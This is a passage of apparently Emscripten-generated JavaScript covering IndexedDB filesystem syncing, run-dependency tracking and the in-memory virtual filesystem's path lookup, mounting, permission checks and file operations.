                var errored = false;
                var db = src.type === "remote" ? src.db : dst.db;
                var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readwrite");
                var store = transaction.objectStore(IDBFS.DB_STORE_NAME);
                function done(err) {
                    if (err && !errored) {
                        errored = true;
                        return callback(err)
                    }
                }
                transaction.onerror = transaction.onabort = e => {
                    done(e.target.error);
                    e.preventDefault()
                }
                    ;
                transaction.oncomplete = e => {
                    if (!errored) {
                        callback(null)
                    }
                }
                    ;
                for (const path of create.sort()) {
                    if (dst.type === "local") {
                        IDBFS.loadRemoteEntry(store, path, (err, entry) => {
                            if (err)
                                return done(err);
                            IDBFS.storeLocalEntry(path, entry, done)
                        }
                        )
                    } else {
                        IDBFS.loadLocalEntry(path, (err, entry) => {
                            if (err)
                                return done(err);
                            IDBFS.storeRemoteEntry(store, path, entry, done)
                        }
                        )
                    }
                }
                for (var path of remove.sort().reverse()) {
                    if (dst.type === "local") {
                        IDBFS.removeLocalEntry(path, done)
                    } else {
                        IDBFS.removeRemoteEntry(store, path, done)
                    }
                }
            }
        };
        var asyncLoad = async url => {
            var arrayBuffer = await readAsync(url);
            return new Uint8Array(arrayBuffer)
        }
            ;
        var FS_createDataFile = (...args) => FS.createDataFile(...args);
        var getUniqueRunDependency = id => id;
        var runDependencies = 0;
        var dependenciesFulfilled = null;
        var removeRunDependency = id => {
            runDependencies--;
            Module["monitorRunDependencies"]?.(runDependencies);
            if (runDependencies == 0) {
                if (dependenciesFulfilled) {
                    var callback = dependenciesFulfilled;
                    dependenciesFulfilled = null;
                    callback()
                }
            }
        }
            ;
        var addRunDependency = id => {
            runDependencies++;
            Module["monitorRunDependencies"]?.(runDependencies)
        }
            ;
        var preloadPlugins = [];
        var FS_handledByPreloadPlugin = async (byteArray, fullname) => {
            if (typeof Browser != "undefined")
                Browser.init();
            for (var plugin of preloadPlugins) {
                if (plugin["canHandle"](fullname)) {
                    return plugin["handle"](byteArray, fullname)
                }
            }
            return byteArray
        }
            ;
        var FS_preloadFile = async (parent, name, url, canRead, canWrite, dontCreateFile, canOwn, preFinish) => {
            var fullname = name ? PATH_FS.resolve(PATH.join2(parent, name)) : parent;
            var dep = getUniqueRunDependency(`cp ${fullname}`);
            addRunDependency(dep);
            try {
                var byteArray = url;
                if (typeof url == "string") {
                    byteArray = await asyncLoad(url)
                }
                byteArray = await FS_handledByPreloadPlugin(byteArray, fullname);
                preFinish?.();
                if (!dontCreateFile) {
                    FS_createDataFile(parent, name, byteArray, canRead, canWrite, canOwn)
                }
            } finally {
                removeRunDependency(dep)
            }
        }
            ;
        var FS_createPreloadedFile = (parent, name, url, canRead, canWrite, onload, onerror, dontCreateFile, canOwn, preFinish) => {
            FS_preloadFile(parent, name, url, canRead, canWrite, dontCreateFile, canOwn, preFinish).then(onload).catch(onerror)
        }
            ;
        var FS = {
            root: null,
            mounts: [],
            devices: {},
            streams: [],
            nextInode: 1,
            nameTable: null,
            currentPath: "/",
            initialized: false,
            ignorePermissions: true,
            filesystems: null,
            syncFSRequests: 0,
            ErrnoError: class {
                name = "ErrnoError";
                constructor(errno) {
                    this.errno = errno
                }
            }
            ,
            FSStream: class {
                shared = {};
                get object() {
                    return this.node
                }
                set object(val) {
                    this.node = val
                }
                get isRead() {
                    return (this.flags & 2097155) !== 1
                }
                get isWrite() {
                    return (this.flags & 2097155) !== 0
                }
                get isAppend() {
                    return this.flags & 1024
                }
                get flags() {
                    return this.shared.flags
                }
                set flags(val) {
                    this.shared.flags = val
                }
                get position() {
                    return this.shared.position
                }
                set position(val) {
                    this.shared.position = val
                }
            }
            ,
            FSNode: class {
                node_ops = {};
                stream_ops = {};
                readMode = 292 | 73;
                writeMode = 146;
                mounted = null;
                constructor(parent, name, mode, rdev) {
                    if (!parent) {
                        parent = this
                    }
                    this.parent = parent;
                    this.mount = parent.mount;
                    this.id = FS.nextInode++;
                    this.name = name;
                    this.mode = mode;
                    this.rdev = rdev;
                    this.atime = this.mtime = this.ctime = Date.now()
                }
                get read() {
                    return (this.mode & this.readMode) === this.readMode
                }
                set read(val) {
                    val ? this.mode |= this.readMode : this.mode &= ~this.readMode
                }
                get write() {
                    return (this.mode & this.writeMode) === this.writeMode
                }
                set write(val) {
                    val ? this.mode |= this.writeMode : this.mode &= ~this.writeMode
                }
                get isFolder() {
                    return FS.isDir(this.mode)
                }
                get isDevice() {
                    return FS.isChrdev(this.mode)
                }
            }
            ,
            lookupPath(path, opts = {}) {
                if (!path) {
                    throw new FS.ErrnoError(44)
                }
                opts.follow_mount ??= true;
                if (!PATH.isAbs(path)) {
                    path = FS.cwd() + "/" + path
                }
                linkloop: for (var nlinks = 0; nlinks < 40; nlinks++) {
                    var parts = path.split("/").filter(p => !!p);
                    var current = FS.root;
                    var current_path = "/";
                    for (var i = 0; i < parts.length; i++) {
                        var islast = i === parts.length - 1;
                        if (islast && opts.parent) {
                            break
                        }
                        if (parts[i] === ".") {
                            continue
                        }
                        if (parts[i] === "..") {
                            current_path = PATH.dirname(current_path);
                            if (FS.isRoot(current)) {
                                path = current_path + "/" + parts.slice(i + 1).join("/");
                                nlinks--;
                                continue linkloop
                            } else {
                                current = current.parent
                            }
                            continue
                        }
                        current_path = PATH.join2(current_path, parts[i]);
                        try {
                            current = FS.lookupNode(current, parts[i])
                        } catch (e) {
                            if (e?.errno === 44 && islast && opts.noent_okay) {
                                return {
                                    path: current_path
                                }
                            }
                            throw e
                        }
                        if (FS.isMountpoint(current) && (!islast || opts.follow_mount)) {
                            current = current.mounted.root
                        }
                        if (FS.isLink(current.mode) && (!islast || opts.follow)) {
                            if (!current.node_ops.readlink) {
                                throw new FS.ErrnoError(52)
                            }
                            var link = current.node_ops.readlink(current);
                            if (!PATH.isAbs(link)) {
                                link = PATH.dirname(current_path) + "/" + link
                            }
                            path = link + "/" + parts.slice(i + 1).join("/");
                            continue linkloop
                        }
                    }
                    return {
                        path: current_path,
                        node: current
                    }
                }
                throw new FS.ErrnoError(32)
            },
            getPath(node) {
                var path;
                while (true) {
                    if (FS.isRoot(node)) {
                        var mount = node.mount.mountpoint;
                        if (!path)
                            return mount;
                        return mount[mount.length - 1] !== "/" ? `${mount}/${path}` : mount + path
                    }
                    path = path ? `${node.name}/${path}` : node.name;
                    node = node.parent
                }
            },
            hashName(parentid, name) {
                var hash = 0;
                for (var i = 0; i < name.length; i++) {
                    hash = (hash << 5) - hash + name.charCodeAt(i) | 0
                }
                return (parentid + hash >>> 0) % FS.nameTable.length
            },
            hashAddNode(node) {
                var hash = FS.hashName(node.parent.id, node.name);
                node.name_next = FS.nameTable[hash];
                FS.nameTable[hash] = node
            },
            hashRemoveNode(node) {
                var hash = FS.hashName(node.parent.id, node.name);
                if (FS.nameTable[hash] === node) {
                    FS.nameTable[hash] = node.name_next
                } else {
                    var current = FS.nameTable[hash];
                    while (current) {
                        if (current.name_next === node) {
                            current.name_next = node.name_next;
                            break
                        }
                        current = current.name_next
                    }
                }
            },
            lookupNode(parent, name) {
                var errCode = FS.mayLookup(parent);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                var hash = FS.hashName(parent.id, name);
                for (var node = FS.nameTable[hash]; node; node = node.name_next) {
                    var nodeName = node.name;
                    if (node.parent.id === parent.id && nodeName === name) {
                        return node
                    }
                }
                return FS.lookup(parent, name)
            },
            createNode(parent, name, mode, rdev) {
                var node = new FS.FSNode(parent, name, mode, rdev);
                FS.hashAddNode(node);
                return node
            },
            destroyNode(node) {
                FS.hashRemoveNode(node)
            },
            isRoot(node) {
                return node === node.parent
            },
            isMountpoint(node) {
                return !!node.mounted
            },
            isFile(mode) {
                return (mode & 61440) === 32768
            },
            isDir(mode) {
                return (mode & 61440) === 16384
            },
            isLink(mode) {
                return (mode & 61440) === 40960
            },
            isChrdev(mode) {
                return (mode & 61440) === 8192
            },
            isBlkdev(mode) {
                return (mode & 61440) === 24576
            },
            isFIFO(mode) {
                return (mode & 61440) === 4096
            },
            isSocket(mode) {
                return (mode & 49152) === 49152
            },
            flagsToPermissionString(flag) {
                var perms = ["r", "w", "rw"][flag & 3];
                if (flag & 512) {
                    perms += "w"
                }
                return perms
            },
            nodePermissions(node, perms) {
                if (FS.ignorePermissions) {
                    return 0
                }
                if (perms.includes("r") && !(node.mode & 292)) {
                    return 2
                }
                if (perms.includes("w") && !(node.mode & 146)) {
                    return 2
                }
                if (perms.includes("x") && !(node.mode & 73)) {
                    return 2
                }
                return 0
            },
            mayLookup(dir) {
                if (!FS.isDir(dir.mode))
                    return 54;
                var errCode = FS.nodePermissions(dir, "x");
                if (errCode)
                    return errCode;
                if (!dir.node_ops.lookup)
                    return 2;
                return 0
            },
            mayCreate(dir, name) {
                if (!FS.isDir(dir.mode)) {
                    return 54
                }
                try {
                    var node = FS.lookupNode(dir, name);
                    return 20
                } catch (e) { }
                return FS.nodePermissions(dir, "wx")
            },
            mayDelete(dir, name, isdir) {
                var node;
                try {
                    node = FS.lookupNode(dir, name)
                } catch (e) {
                    return e.errno
                }
                var errCode = FS.nodePermissions(dir, "wx");
                if (errCode) {
                    return errCode
                }
                if (isdir) {
                    if (!FS.isDir(node.mode)) {
                        return 54
                    }
                    if (FS.isRoot(node) || FS.getPath(node) === FS.cwd()) {
                        return 10
                    }
                } else if (FS.isDir(node.mode)) {
                    return 31
                }
                return 0
            },
            mayOpen(node, flags) {
                if (!node) {
                    return 44
                }
                if (FS.isLink(node.mode)) {
                    return 32
                }
                var mode = FS.flagsToPermissionString(flags);
                if (FS.isDir(node.mode)) {
                    if (mode !== "r" || flags & (512 | 64)) {
                        return 31
                    }
                }
                return FS.nodePermissions(node, mode)
            },
            checkOpExists(op, err) {
                if (!op) {
                    throw new FS.ErrnoError(err)
                }
                return op
            },
            MAX_OPEN_FDS: 4096,
            nextfd() {
                for (var fd = 0; fd <= FS.MAX_OPEN_FDS; fd++) {
                    if (!FS.streams[fd]) {
                        return fd
                    }
                }
                throw new FS.ErrnoError(33)
            },
            getStreamChecked(fd) {
                var stream = FS.getStream(fd);
                if (!stream) {
                    throw new FS.ErrnoError(8)
                }
                return stream
            },
            getStream: fd => FS.streams[fd],
            createStream(stream, fd = -1) {
                stream = Object.assign(new FS.FSStream, stream);
                if (fd == -1) {
                    fd = FS.nextfd()
                }
                stream.fd = fd;
                FS.streams[fd] = stream;
                return stream
            },
            closeStream(fd) {
                FS.streams[fd] = null
            },
            dupStream(origStream, fd = -1) {
                var stream = FS.createStream(origStream, fd);
                stream.stream_ops?.dup?.(stream);
                return stream
            },
            doSetAttr(stream, node, attr) {
                var setattr = stream?.stream_ops.setattr;
                var arg = setattr ? stream : node;
                setattr ??= node.node_ops.setattr;
                FS.checkOpExists(setattr, 63);
                setattr(arg, attr)
            },
            chrdev_stream_ops: {
                open(stream) {
                    var device = FS.getDevice(stream.node.rdev);
                    stream.stream_ops = device.stream_ops;
                    stream.stream_ops.open?.(stream)
                },
                llseek() {
                    throw new FS.ErrnoError(70)
                }
            },
            major: dev => dev >> 8,
            minor: dev => dev & 255,
            makedev: (ma, mi) => ma << 8 | mi,
            registerDevice(dev, ops) {
                FS.devices[dev] = {
                    stream_ops: ops
                }
            },
            getDevice: dev => FS.devices[dev],
            getMounts(mount) {
                var mounts = [];
                var check = [mount];
                while (check.length) {
                    var m = check.pop();
                    mounts.push(m);
                    check.push(...m.mounts)
                }
                return mounts
            },
            syncfs(populate, callback) {
                if (typeof populate == "function") {
                    callback = populate;
                    populate = false
                }
                FS.syncFSRequests++;
                if (FS.syncFSRequests > 1) {
                    err(`warning: ${FS.syncFSRequests} FS.syncfs operations in flight at once, probably just doing extra work`)
                }
                var mounts = FS.getMounts(FS.root.mount);
                var completed = 0;
                function doCallback(errCode) {
                    FS.syncFSRequests--;
                    return callback(errCode)
                }
                function done(errCode) {
                    if (errCode) {
                        if (!done.errored) {
                            done.errored = true;
                            return doCallback(errCode)
                        }
                        return
                    }
                    if (++completed >= mounts.length) {
                        doCallback(null)
                    }
                }
                for (var mount of mounts) {
                    if (mount.type.syncfs) {
                        mount.type.syncfs(mount, populate, done)
                    } else {
                        done(null)
                    }
                }
            },
            mount(type, opts, mountpoint) {
                var root = mountpoint === "/";
                var pseudo = !mountpoint;
                var node;
                if (root && FS.root) {
                    throw new FS.ErrnoError(10)
                } else if (!root && !pseudo) {
                    var lookup = FS.lookupPath(mountpoint, {
                        follow_mount: false
                    });
                    mountpoint = lookup.path;
                    node = lookup.node;
                    if (FS.isMountpoint(node)) {
                        throw new FS.ErrnoError(10)
                    }
                    if (!FS.isDir(node.mode)) {
                        throw new FS.ErrnoError(54)
                    }
                }
                var mount = {
                    type,
                    opts,
                    mountpoint,
                    mounts: []
                };
                var mountRoot = type.mount(mount);
                mountRoot.mount = mount;
                mount.root = mountRoot;
                if (root) {
                    FS.root = mountRoot
                } else if (node) {
                    node.mounted = mount;
                    if (node.mount) {
                        node.mount.mounts.push(mount)
                    }
                }
                return mountRoot
            },
            unmount(mountpoint) {
                var lookup = FS.lookupPath(mountpoint, {
                    follow_mount: false
                });
                if (!FS.isMountpoint(lookup.node)) {
                    throw new FS.ErrnoError(28)
                }
                var node = lookup.node;
                var mount = node.mounted;
                var mounts = FS.getMounts(mount);
                for (var [hash, current] of Object.entries(FS.nameTable)) {
                    while (current) {
                        var next = current.name_next;
                        if (mounts.includes(current.mount)) {
                            FS.destroyNode(current)
                        }
                        current = next
                    }
                }
                node.mounted = null;
                var idx = node.mount.mounts.indexOf(mount);
                node.mount.mounts.splice(idx, 1)
            },
            lookup(parent, name) {
                return parent.node_ops.lookup(parent, name)
            },
            mknod(path, mode, dev) {
                var lookup = FS.lookupPath(path, {
                    parent: true
                });
                var parent = lookup.node;
                var name = PATH.basename(path);
                if (!name) {
                    throw new FS.ErrnoError(28)
                }
                if (name === "." || name === "..") {
                    throw new FS.ErrnoError(20)
                }
                var errCode = FS.mayCreate(parent, name);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                if (!parent.node_ops.mknod) {
                    throw new FS.ErrnoError(63)
                }
                return parent.node_ops.mknod(parent, name, mode, dev)
            },
            statfs(path) {
                return FS.statfsNode(FS.lookupPath(path, {
                    follow: true
                }).node)
            },
            statfsStream(stream) {
                return FS.statfsNode(stream.node)
            },
            statfsNode(node) {
                var rtn = {
                    bsize: 4096,
                    frsize: 4096,
                    blocks: 1e6,
                    bfree: 5e5,
                    bavail: 5e5,
                    files: FS.nextInode,
                    ffree: FS.nextInode - 1,
                    fsid: 42,
                    flags: 2,
                    namelen: 255
                };
                if (node.node_ops.statfs) {
                    Object.assign(rtn, node.node_ops.statfs(node.mount.opts.root))
                }
                return rtn
            },
            create(path, mode = 438) {
                mode &= 4095;
                mode |= 32768;
                return FS.mknod(path, mode, 0)
            },
            mkdir(path, mode = 511) {
                mode &= 511 | 512;
                mode |= 16384;
                return FS.mknod(path, mode, 0)
            },
            mkdirTree(path, mode) {
                var dirs = path.split("/");
                var d = "";
                for (var dir of dirs) {
                    if (!dir)
                        continue;
                    if (d || PATH.isAbs(path))
                        d += "/";
                    d += dir;
                    try {
                        FS.mkdir(d, mode)
                    } catch (e) {
                        if (e.errno != 20)
                            throw e
                    }
                }
            },
            mkdev(path, mode, dev) {
                if (typeof dev == "undefined") {
                    dev = mode;
                    mode = 438
                }
                mode |= 8192;
                return FS.mknod(path, mode, dev)
            },
            symlink(oldpath, newpath) {
                if (!PATH_FS.resolve(oldpath)) {
                    throw new FS.ErrnoError(44)
                }
                var lookup = FS.lookupPath(newpath, {
                    parent: true
                });
                var parent = lookup.node;
                if (!parent) {
                    throw new FS.ErrnoError(44)
                }
                var newname = PATH.basename(newpath);
                var errCode = FS.mayCreate(parent, newname);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                if (!parent.node_ops.symlink) {
                    throw new FS.ErrnoError(63)
                }
                return parent.node_ops.symlink(parent, newname, oldpath)
            },
            rename(old_path, new_path) {
                var old_dirname = PATH.dirname(old_path);
                var new_dirname = PATH.dirname(new_path);
                var old_name = PATH.basename(old_path);
                var new_name = PATH.basename(new_path);
                var lookup, old_dir, new_dir;
                lookup = FS.lookupPath(old_path, {
                    parent: true
                });
                old_dir = lookup.node;
                lookup = FS.lookupPath(new_path, {
                    parent: true
                });
                new_dir = lookup.node;
                if (!old_dir || !new_dir)
                    throw new FS.ErrnoError(44);
                if (old_dir.mount !== new_dir.mount) {
                    throw new FS.ErrnoError(75)
                }
                var old_node = FS.lookupNode(old_dir, old_name);
                var relative = PATH_FS.relative(old_path, new_dirname);
                if (relative.charAt(0) !== ".") {
                    throw new FS.ErrnoError(28)
                }
                relative = PATH_FS.relative(new_path, old_dirname);
                if (relative.charAt(0) !== ".") {
                    throw new FS.ErrnoError(55)
                }
                var new_node;
                try {
                    new_node = FS.lookupNode(new_dir, new_name)
                } catch (e) { }
                if (old_node === new_node) {
                    return
                }
                var isdir = FS.isDir(old_node.mode);
                var errCode = FS.mayDelete(old_dir, old_name, isdir);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                errCode = new_node ? FS.mayDelete(new_dir, new_name, isdir) : FS.mayCreate(new_dir, new_name);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                if (!old_dir.node_ops.rename) {
                    throw new FS.ErrnoError(63)
                }
                if (FS.isMountpoint(old_node) || new_node && FS.isMountpoint(new_node)) {
                    throw new FS.ErrnoError(10)
                }
                if (new_dir !== old_dir) {
                    errCode = FS.nodePermissions(old_dir, "w");
                    if (errCode) {
                        throw new FS.ErrnoError(errCode)
                    }
                }
                FS.hashRemoveNode(old_node);
                try {
                    old_dir.node_ops.rename(old_node, new_dir, new_name);
                    old_node.parent = new_dir
                } catch (e) {
                    throw e
                } finally {
                    FS.hashAddNode(old_node)
                }
            },
            rmdir(path) {
                var lookup = FS.lookupPath(path, {
                    parent: true
                });
                var parent = lookup.node;
                var name = PATH.basename(path);
                var node = FS.lookupNode(parent, name);
                var errCode = FS.mayDelete(parent, name, true);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                if (!parent.node_ops.rmdir) {
                    throw new FS.ErrnoError(63)
                }
                if (FS.isMountpoint(node)) {
                    throw new FS.ErrnoError(10)
                }
                parent.node_ops.rmdir(parent, name);
                FS.destroyNode(node)
            },
            readdir(path) {
                var lookup = FS.lookupPath(path, {
                    follow: true
                });
                var node = lookup.node;
                var readdir = FS.checkOpExists(node.node_ops.readdir, 54);
                return readdir(node)
            },
            unlink(path) {
                var lookup = FS.lookupPath(path, {
                    parent: true
                });
                var parent = lookup.node;
                if (!parent) {
                    throw new FS.ErrnoError(44)
                }
                var name = PATH.basename(path);
                var node = FS.lookupNode(parent, name);
                var errCode = FS.mayDelete(parent, name, false);
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                if (!parent.node_ops.unlink) {
                    throw new FS.ErrnoError(63)
                }
                if (FS.isMountpoint(node)) {
                    throw new FS.ErrnoError(10)
                }
                parent.node_ops.unlink(parent, name);
                FS.destroyNode(node)
            },
            readlink(path) {
                var lookup = FS.lookupPath(path);
                var link = lookup.node;
                if (!link) {
                    throw new FS.ErrnoError(44)
                }
                if (!link.node_ops.readlink) {
                    throw new FS.ErrnoError(28)
                }
                return link.node_ops.readlink(link)
            },
            stat(path, dontFollow) {
                var lookup = FS.lookupPath(path, {
                    follow: !dontFollow
                });
                var node = lookup.node;
                var getattr = FS.checkOpExists(node.node_ops.getattr, 63);
                return getattr(node)
            },
            fstat(fd) {
                var stream = FS.getStreamChecked(fd);
                var node = stream.node;
                var getattr = stream.stream_ops.getattr;
                var arg = getattr ? stream : node;
                getattr ??= node.node_ops.getattr;
                FS.checkOpExists(getattr, 63);
                return getattr(arg)
            },
            lstat(path) {
                return FS.stat(path, true)
            },
            doChmod(stream, node, mode, dontFollow) {
                FS.doSetAttr(stream, node, {
                    mode: mode & 4095 | node.mode & ~4095,
                    ctime: Date.now(),
                    dontFollow
                })
            },
            chmod(path, mode, dontFollow) {
                var node;
                if (typeof path == "string") {
                    var lookup = FS.lookupPath(path, {
                        follow: !dontFollow
                    });
                    node = lookup.node
                } else {
                    node = path
                }
                FS.doChmod(null, node, mode, dontFollow)
            },
            lchmod(path, mode) {
                FS.chmod(path, mode, true)
            },
            fchmod(fd, mode) {
                var stream = FS.getStreamChecked(fd);
                FS.doChmod(stream, stream.node, mode, false)
            },
            doChown(stream, node, dontFollow) {
                FS.doSetAttr(stream, node, {
                    timestamp: Date.now(),
                    dontFollow
                })
            },
            chown(path, uid, gid, dontFollow) {
                var node;
                if (typeof path == "string") {
                    var lookup = FS.lookupPath(path, {
                        follow: !dontFollow
                    });
                    node = lookup.node
                } else {
                    node = path
                }
                FS.doChown(null, node, dontFollow)
            },
            lchown(path, uid, gid) {
                FS.chown(path, uid, gid, true)
            },
            fchown(fd, uid, gid) {
                var stream = FS.getStreamChecked(fd);
                FS.doChown(stream, stream.node, false)
            },
            doTruncate(stream, node, len) {
                if (FS.isDir(node.mode)) {
                    throw new FS.ErrnoError(31)
                }
                if (!FS.isFile(node.mode)) {
                    throw new FS.ErrnoError(28)
                }
                var errCode = FS.nodePermissions(node, "w");
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                FS.doSetAttr(stream, node, {
                    size: len,
                    timestamp: Date.now()
                })
            },
            truncate(path, len) {
                if (len < 0) {
                    throw new FS.ErrnoError(28)
                }
                var node;
                if (typeof path == "string") {
                    var lookup = FS.lookupPath(path, {
                        follow: true
                    });
                    node = lookup.node
                } else {
                    node = path
                }
                FS.doTruncate(null, node, len)
            },
            ftruncate(fd, len) {
                var stream = FS.getStreamChecked(fd);
                if (len < 0 || (stream.flags & 2097155) === 0) {
                    throw new FS.ErrnoError(28)
                }
                FS.doTruncate(stream, stream.node, len)
            },
            utime(path, atime, mtime) {
                var lookup = FS.lookupPath(path, {
                    follow: true
                });
                var node = lookup.node;
                var setattr = FS.checkOpExists(node.node_ops.setattr, 63);
                setattr(node, {
                    atime,
                    mtime
                })
            },
            open(path, flags, mode = 438) {
                if (path === "") {
                    throw new FS.ErrnoError(44)
                }
                flags = typeof flags == "string" ? FS_modeStringToFlags(flags) : flags;
                if (flags & 64) {
                    mode = mode & 4095 | 32768
                } else {
                    mode = 0
                }
                var node;
                var isDirPath;
                if (typeof path == "object") {
                    node = path
                } else {
                    isDirPath = path.endsWith("/");
                    var lookup = FS.lookupPath(path, {
                        follow: !(flags & 131072),
                        noent_okay: true
                    });
                    node = lookup.node;
                    path = lookup.path
                }
                var created = false;
                if (flags & 64) {
                    if (node) {
                        if (flags & 128) {
                            throw new FS.ErrnoError(20)
                        }
                    } else if (isDirPath) {
                        throw new FS.ErrnoError(31)
                    } else {
                        node = FS.mknod(path, mode | 511, 0);
                        created = true
                    }
                }
                if (!node) {
                    throw new FS.ErrnoError(44)
                }
                if (FS.isChrdev(node.mode)) {
                    flags &= ~512
                }
                if (flags & 65536 && !FS.isDir(node.mode)) {
                    throw new FS.ErrnoError(54)
                }
                if (!created) {
                    var errCode = FS.mayOpen(node, flags);
                    if (errCode) {
                        throw new FS.ErrnoError(errCode)
                    }
                }
                if (flags & 512 && !created) {
                    FS.truncate(node, 0)
                }
                flags &= ~(128 | 512 | 131072);
                var stream = FS.createStream({
                    node,
                    path: FS.getPath(node),
                    flags,
                    seekable: true,
                    position: 0,
                    stream_ops: node.stream_ops,
                    ungotten: [],
                    error: false
                });
                if (stream.stream_ops.open) {
                    stream.stream_ops.open(stream)
                }
                if (created) {
                    FS.chmod(node, mode & 511)
                }
                return stream
            },
            close(stream) {
                if (FS.isClosed(stream)) {
                    throw new FS.ErrnoError(8)
                }
                if (stream.getdents)
                    stream.getdents = null;
                try {
                    if (stream.stream_ops.close) {
                        stream.stream_ops.close(stream)
                    }
                } catch (e) {
                    throw e
                } finally {
                    FS.closeStream(stream.fd)
                }
                stream.fd = null
            },
            isClosed(stream) {
                return stream.fd === null
            },
            llseek(stream, offset, whence) {
                if (FS.isClosed(stream)) {
                    throw new FS.ErrnoError(8)
                }
                if (!stream.seekable || !stream.stream_ops.llseek) {
                    throw new FS.ErrnoError(70)
                }
                if (whence != 0 && whence != 1 && whence != 2) {
                    throw new FS.ErrnoError(28)
                }
                stream.position = stream.stream_ops.llseek(stream, offset, whence);
                stream.ungotten = [];
                return stream.position
            },
            read(stream, buffer, offset, length, position) {
                if (length < 0 || position < 0) {
                    throw new FS.ErrnoError(28)
                }
                if (FS.isClosed(stream)) {
                    throw new FS.ErrnoError(8)
                }
                if ((stream.flags & 2097155) === 1) {
                    throw new FS.ErrnoError(8)
                }
                if (FS.isDir(stream.node.mode)) {
                    throw new FS.ErrnoError(31)
                }
                if (!stream.stream_ops.read) {
                    throw new FS.ErrnoError(28)
                }
                var seeking = typeof position != "undefined";
                if (!seeking) {
                    position = stream.position
                } else if (!stream.seekable) {
                    throw new FS.ErrnoError(70)
                }
                var bytesRead = stream.stream_ops.read(stream, buffer, offset, length, position);
                if (!seeking)
                    stream.position += bytesRead;
                return bytesRead
            },
            write(stream, buffer, offset, length, position, canOwn) {
                if (length < 0 || position < 0) {
                    throw new FS.ErrnoError(28)
                }
                if (FS.isClosed(stream)) {
                    throw new FS.ErrnoError(8)
                }
                if ((stream.flags & 2097155) === 0) {
                    throw new FS.ErrnoError(8)
                }
                if (FS.isDir(stream.node.mode)) {
                    throw new FS.ErrnoError(31)
                }
                if (!stream.stream_ops.write) {
                    throw new FS.ErrnoError(28)
                }
                if (stream.seekable && stream.flags & 1024) {
                    FS.llseek(stream, 0, 2)
                }
                var seeking = typeof position != "undefined";
                if (!seeking) {
                    position = stream.position
                } else if (!stream.seekable) {
                    throw new FS.ErrnoError(70)
                }
                var bytesWritten = stream.stream_ops.write(stream, buffer, offset, length, position, canOwn);
                if (!seeking)
                    stream.position += bytesWritten;
                return bytesWritten
            },
            mmap(stream, length, position, prot, flags) {
                if ((prot & 2) !== 0 && (flags & 2) === 0 && (stream.flags & 2097155) !== 2) {
                    throw new FS.ErrnoError(2)
                }
                if ((stream.flags & 2097155) === 1) {
                    throw new FS.ErrnoError(2)
                }
                if (!stream.stream_ops.mmap) {
                    throw new FS.ErrnoError(43)
                }
                if (!length) {
                    throw new FS.ErrnoError(28)
                }
                return stream.stream_ops.mmap(stream, length, position, prot, flags)
            },
            msync(stream, buffer, offset, length, mmapFlags) {
                if (!stream.stream_ops.msync) {
                    return 0
                }
                return stream.stream_ops.msync(stream, buffer, offset, length, mmapFlags)
            },
            ioctl(stream, cmd, arg) {
                if (!stream.stream_ops.ioctl) {
                    throw new FS.ErrnoError(59)
                }
                return stream.stream_ops.ioctl(stream, cmd, arg)
            },
            readFile(path, opts = {}) {
                opts.flags = opts.flags || 0;
                opts.encoding = opts.encoding || "binary";
                if (opts.encoding !== "utf8" && opts.encoding !== "binary") {
                    abort(`Invalid encoding type "${opts.encoding}"`)
                }
                var stream = FS.open(path, opts.flags);
                var stat = FS.stat(path);
                var length = stat.size;
                var buf = new Uint8Array(length);
                FS.read(stream, buf, 0, length, 0);
                if (opts.encoding === "utf8") {
                    buf = UTF8ArrayToString(buf)
                }
                FS.close(stream);
                return buf
            },
            writeFile(path, data, opts = {}) {
                opts.flags = opts.flags || 577;
                var stream = FS.open(path, opts.flags, opts.mode);
                if (typeof data == "string") {
                    data = new Uint8Array(intArrayFromString(data, true))
                }
                if (ArrayBuffer.isView(data)) {
                    FS.write(stream, data, 0, data.byteLength, undefined, opts.canOwn)
                } else {
                    abort("Unsupported data type")
                }
                FS.close(stream)
            },
            cwd: () => FS.currentPath,
            chdir(path) {
                var lookup = FS.lookupPath(path, {
                    follow: true
                });
                if (lookup.node === null) {
                    throw new FS.ErrnoError(44)
                }
                if (!FS.isDir(lookup.node.mode)) {
                    throw new FS.ErrnoError(54)
                }
                var errCode = FS.nodePermissions(lookup.node, "x");
                if (errCode) {
                    throw new FS.ErrnoError(errCode)
                }
                FS.currentPath = lookup.path
            },
            createDefaultDirectories() {
                FS.mkdir("/tmp");
                FS.mkdir("/home");
                FS.mkdir("/home/web_user")
            },
            createDefaultDevices() {
                FS.mkdir("/dev");
                FS.registerDevice(FS.makedev(1, 3), {
                    read: () => 0,
                    write: (stream, buffer, offset, length, pos) => length,
                    llseek: () => 0
                });
                FS.mkdev("/dev/null", FS.makedev(1, 3));
                TTY.register(FS.makedev(5, 0), TTY.default_tty_ops);
                TTY.register(FS.makedev(6, 0), TTY.default_tty1_ops);
                FS.mkdev("/dev/tty", FS.makedev(5, 0));
                FS.mkdev("/dev/tty1", FS.makedev(6, 0));
                var randomBuffer = new Uint8Array(1024)
                    , randomLeft = 0;
                var randomByte = () => {
                    if (randomLeft === 0) {
                        randomFill(randomBuffer);
                        randomLeft = randomBuffer.byteLength
                    }
                    return randomBuffer[--randomLeft]
                }
                    ;
                FS.createDevice("/dev", "random", randomByte);
                FS.createDevice("/dev", "urandom", randomByte);
                FS.mkdir("/dev/shm");
                FS.mkdir("/dev/shm/tmp")
            },
            createSpecialDirectories() {
                FS.mkdir("/proc");
                var proc_self = FS.mkdir("/proc/self");
                FS.mkdir("/proc/self/fd");
                FS.mount({
                    mount() {
                        var node = FS.createNode(proc_self, "fd", 16895, 73);
                        node.stream_ops = {
                            llseek: MEMFS.stream_ops.llseek
                        };
                        node.node_ops = {
                            lookup(parent, name) {
                                var fd = +name;
                                var stream = FS.getStreamChecked(fd);
                                var ret = {
                                    parent: null,
                                    mount: {
                                        mountpoint: "fake"
                                    },
                                    node_ops: {
                                        readlink: () => stream.path
                                    },
                                    id: fd + 1
                                };
                                ret.parent = ret;
                                return ret
                            },
                            readdir() {
                                return Array.from(FS.streams.entries()).filter(([k, v]) => v).map(([k, v]) => k.toString())
                            }
                        };
                        return node
                    }
